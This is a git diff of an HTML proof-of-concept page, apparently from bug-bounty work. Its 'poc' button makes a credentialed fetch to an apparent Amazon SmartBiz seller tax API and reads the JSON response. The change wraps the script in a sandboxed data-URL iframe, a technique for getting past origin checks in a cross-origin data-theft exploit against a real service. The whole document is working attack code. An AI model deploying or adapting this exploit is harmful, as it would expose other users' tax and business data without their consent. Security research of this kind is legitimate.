@@ -4,9 +4,8 @@
   </head>
   <body>
     <button id="poc">req</button>
-    <script>
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
       document.getElementById('poc').addEventListener('click', function() {
-        window.open("https://smartbiz.amazon.in/settings/gst-seller", "_blank");
         const url = "https://smartbiz.amazon.in/api/stores/66307/tax";
         fetch(url, { credentials: "include" }) 
           .then(r => r.json())
@@ -28,6 +27,6 @@
             alert("Error: " + err);
           });
       });
-    </script>
+    </script>"></iframe>
   </body>
 </html>
